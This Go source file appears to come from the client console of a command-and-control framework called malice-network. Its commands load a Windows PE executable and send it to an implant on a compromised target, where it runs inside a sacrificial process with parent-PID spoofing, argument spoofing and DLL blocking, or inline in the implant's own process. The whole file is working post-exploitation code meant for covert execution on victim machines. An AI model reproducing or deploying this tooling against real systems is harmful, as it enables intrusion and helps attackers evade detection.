package exec

import (
	"github.com/chainreactors/grumble"
	"github.com/chainreactors/malice-network/client/console"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/helper"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"
	"os"
	"path/filepath"
)

// ExecutePECmd - Execute PE on sacrifice process
func ExecutePECmd(cmd *cobra.Command, con *console.Console) {
	path := cmd.Flags().Arg(0)
	params := cmd.Flags().Args()[1:]
	ppid, _ := cmd.Flags().GetUint("ppid")
	processname, _ := cmd.Flags().GetString("process")
	argue, _ := cmd.Flags().GetString("argue")
	isBlockDll, _ := cmd.Flags().GetBool("block_dll")
	peBin, err := os.ReadFile(path)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}
	if helper.CheckPEType(peBin) != consts.EXEFile {
		console.Log.Errorf("The file is not a PE file\n")
		return
	}
	execPe(path, peBin, params, int(ppid), processname, argue, isBlockDll, con)
}

func execPe(pePath string, peBin []byte, paramString []string, ppid int, processname, argue string,
	isBlockDll bool, con *console.Console) {
	session := con.GetInteractive()
	if session == nil {
		return
	}
	sid := con.GetInteractive().SessionId
	task, err := con.Rpc.ExecutePE(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name:   filepath.Base(pePath),
		Bin:    peBin,
		Type:   consts.ModuleExecutePE,
		Output: true,
		Sacrifice: &implantpb.SacrificeProcess{
			Output:   true,
			BlockDll: isBlockDll,
			Ppid:     uint32(ppid),
			Argue:    argue,
			Params:   append([]string{processname}, paramString...),
		},
	})

	if err != nil {
		console.Log.Errorf("%s\n", err)
		return
	}

	con.AddCallback(task.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		con.SessionLog(sid).Consolef("Executed PE on target: %s\n", resp.GetAssemblyResponse().GetData())
	})
}

// InlinePECmd - Execute PE in current process
func InlinePECmd(ctx *grumble.Context, con *console.Console) {
	session := con.GetInteractive()
	if session == nil {
		return
	}
	sid := con.GetInteractive().SessionId
	pePath := ctx.Args.String("path")
	peBin, err := os.ReadFile(pePath)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}
	if helper.CheckPEType(peBin) != consts.EXEFile {
		console.Log.Errorf("The file is not a PE file\n")
		return
	}
	shellcodeTask, err := con.Rpc.ExecutePE(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name:   filepath.Base(pePath),
		Bin:    peBin,
		Type:   consts.ModuleExecutePE,
		Output: true,
	})

	if err != nil {
		console.Log.Errorf("%s\n", err)
		return
	}

	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		if !(resp.Status.Error != "") {
			con.SessionLog(sid).Consolef("Executed PE on target: %s\n", resp.GetAssemblyResponse().GetData())
		}
	})
}
